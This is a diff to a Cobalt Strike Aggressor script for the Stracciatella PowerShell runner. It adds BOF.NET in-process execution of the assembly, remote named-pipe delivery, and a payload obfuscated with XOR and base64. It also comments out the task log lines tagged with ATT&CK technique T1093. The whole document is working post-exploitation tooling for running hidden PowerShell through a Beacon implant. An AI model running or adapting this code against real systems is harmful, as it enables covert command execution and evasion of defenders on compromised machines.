@@ -19,6 +19,13 @@ global('$STRACCIATELLA_PATH %IMPORTED_SCRIPTS %IMPORTED_CMDLETS $STRACCIATELLA_P
 $STRACCIATELLA_PATH = script_resource("Stracciatella.exe");
 $STRACCIATELLA_PIPE_READ_TIMEOUT = 10 * 60 * 1000;
 
+#
+# If there's BOF.NET loaded in Cobalt Strike, prefer `bofnet_jobassembly` command over `execute-assembly`.
+# This is useful when we want to switch our tactics to running inline/in-process via BOF.NET instead of fork & run.
+#
+$FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY = "true";
+
+
 %IMPORTED_SCRIPTS = %();
 %IMPORTED_CMDLETS = %();
 
@@ -52,6 +59,23 @@ beacon_command_register(
     "Sets timeout for named pipe read operation conducted by Stracciatella while awaiting for input script. Should be greater than Beacon's sleep parameter.",
     "Use: stracciatella-timeout <milliseconds>\n\nDescription: Stracciatella will be spawned with a randomly generated pipe name. That named pipe will then be used by accompanying aggressor script to pass powershell commands to be executed by Stracciatella after it reads them from a pipe bound for listening. Since the write-pipe operation can be scheduled and executed after a round sleep-time delay, Stracciatella may be found long after closing its named pipe due to no input timeout. This command allows to configure the time Stracciatella should wait for incoming data on its named pipe for reading. This value should be around (SleepTime+25 seconds). ");
 
+beacon_command_register(
+    "bofnet_loadstracciatella",
+    "Loads Stracciatella into BOF.NET.",
+    "Loads Stracciatella into BOF.NET. Works only if BOF.NET is available in Cobalt Strike.");
+
+$has_bofnet_commands = false;
+
+sub checkBofnet {
+    if($has_bofnet_commands == false) {
+        foreach $command (beacon_commands()) {
+            if('bofnet_init' iswm $command) {
+                $has_bofnet_commands = true;
+                break;
+            }
+        }
+    }
+}
 
 sub writePipe {
     local('$bid $machine $pipeName $data $pipe');
@@ -188,6 +212,48 @@ sub stracciatellaRestoreSettings {
     }
 }
 
+sub executeAssembly {
+    local('$bid $localpath $args $assemblyName $pos $firstScriptBytes $msg');
+
+    $bid = $1;
+    $localpath = $2;
+    $args = $3;
+    $firstScriptBytes = $4;
+    $msg = $5;
+
+    $useBofnet = false;
+
+    if($has_bofnet_commands == true) {
+        if($FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY eq "true") {
+            $useBofnet = true;
+        }
+    }
+
+    if($useBofnet) 
+    {
+        $assemblyName = getFileName($localpath);
+        $pos = lindexOf($assemblyName, ".");
+
+        if($pos) {
+            $assemblyName = substr($assemblyName, 0, $pos);
+        }
+
+        $assemblyName = lc($assemblyName);
+
+        btask($bid, "Tasked beacon to run Stracciatella $msg via bofnet_jobassembly \c7" . $assemblyName . " $args \o");
+        println("Stracciatella: augmented bofnet_jobassembly: bid='" . $bid . "', assemblyName='" . $assemblyName . "', args=' -l ' $+ $firstScriptBytes $+ ' " . $args . "'");
+
+        fireAlias($bid, "bofnet_jobassembly", "$assemblyName -l ' $+ $firstScriptBytes $+ ' $args");
+    }
+    else 
+    {
+        btask($bid, "Tasked beacon to run Stracciatella $msg $+ : \c7" . getFileName($localpath) . " $args \o");
+        println("Stracciatella: augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+
+        bexecute_assembly!($bid, $localpath, $args);
+    }
+}
+
 sub runStracciatella {
     local('$bid $args $args0 $s $imported $cradle $scriptContents $opts $key $enc $verbose $pipename');
     $bid = $1;
@@ -196,6 +262,7 @@ sub runStracciatella {
     $pipename = $4;
     $args = $5;
     $customScript = $6;
+
     $args0 = $args;
 
     #println("Running stracciatella with verbose = ' $+ $verbose $+ ' ; machine = ' $+ $machine $+ ' ; pipename = ' $+ $pipename $+ ' ; command = ' $+ $args $+ ' ; customScript = ' $+ $customScript $+ '");
@@ -205,11 +272,17 @@ sub runStracciatella {
     $imported = 0;
     $custom = 0;
 
+    $len = strlen($args);
+    if($len > 50) { $len = 50; }
+
+    $firstScriptBytes = substr($args, 0, $len);
+
     if(strlen($customScript) > 0) {
         $scriptContents = readFile($customScript);
 
         if(strlen($scriptContents) > 0) {
             if(right($scriptContents, 1) eq ";") { $s = " "; }
+
             $args = powershell_compress($scriptContents) . $s . $args;
             $imported = 1;
             $custom = 1;
@@ -223,6 +296,7 @@ sub runStracciatella {
 
             if(strlen($scriptContents) > 0) {
                 if(right($scriptContents, 1) eq ";") { $s = " "; }
+
                 $args = powershell_compress($scriptContents) . $s . $args;
                 $imported = 1;
             }
@@ -234,20 +308,46 @@ sub runStracciatella {
     $enc = base64_encode(str_xor($args, chr($key)));
     $opts = "$verbose $+ -x $key -p $pipename -e -t $STRACCIATELLA_PIPE_READ_TIMEOUT";
 
+    $msg = "";
+
     if($imported == 0) {
-        btask($1, "Tasked Beacon to run Stracciatella: $args0", "T1093");
+        #btask($1, "Tasked Beacon to run Stracciatella: $args0", "T1093");
     }
     else {
         if ($custom == 1) {
-            btask($1, "Tasked Beacon to run Stracciatella with pre-loaded custom script ( $+ " . getFileName($customScript) . " $+ ): $args0", "T1093");
+            #btask($1, "Tasked Beacon to run Stracciatella with pre-loaded custom script ( $+ " . getFileName($customScript) . " $+ ): $args0", "T1093");
+            $msg = "with pre-loaded custom script ( $+ " . getFileName($customScript) . " $+ )";
         }
         else {
-            btask($1, "Tasked Beacon to run Stracciatella with imported script ( $+ " . getFileName(%IMPORTED_SCRIPTS[$1]) . " $+ ): $args0", "T1093");
+            #btask($1, "Tasked Beacon to run Stracciatella with imported script ( $+ " . getFileName(%IMPORTED_SCRIPTS[$1]) . " $+ ): $args0", "T1093");
+            $msg = "with imported script ( $+ " . getFileName(%IMPORTED_SCRIPTS[$1]) . " $+ )";
         }
     }
 
-    bexecute_assembly!($1, $STRACCIATELLA_PATH, $opts);
-    writePipe($1, ".", $pipename, $enc);
+    if($machine eq ".") {
+        executeAssembly($1, $STRACCIATELLA_PATH, $opts, $firstScriptBytes, $msg);
+    }
+
+    writePipe($1, $machine, $pipename, $enc);
+}
+
+alias bofnet_loadstracciatella {
+    $useBofnet = false;
+
+    if($has_bofnet_commands == true) {
+        if($FAVOR_BOFNET_INSTEAD_OF_EXECUTE_ASSEMBLY eq "true") {
+            $useBofnet = true;
+        }
+    }
+
+    if($useBofnet) 
+    {
+        fireAlias($1, "bofnet_load", $STRACCIATELLA_PATH);
+    }
+    else 
+    {
+        berror($1, "BOF.NET is not loaded into Cobalt Strike. Load it first before using this alias.");
+    }
 }
 
 alias stracciatella-import {
@@ -329,6 +429,7 @@ alias stracciatella-remote {
 
     $pipename = substr($args, 0, $pos);
     $args = substr($args, $pos + 1);
+
     runStracciatella($1, $verbose, $machine, $pipename, $args, "");
 }
 
@@ -360,4 +461,5 @@ alias stracciatella-script {
     runStracciatella($1, $verbose, ".", $pipename, $args, $customScript);
 }
 
+checkBofnet();
 stracciatellaRestoreSettings();
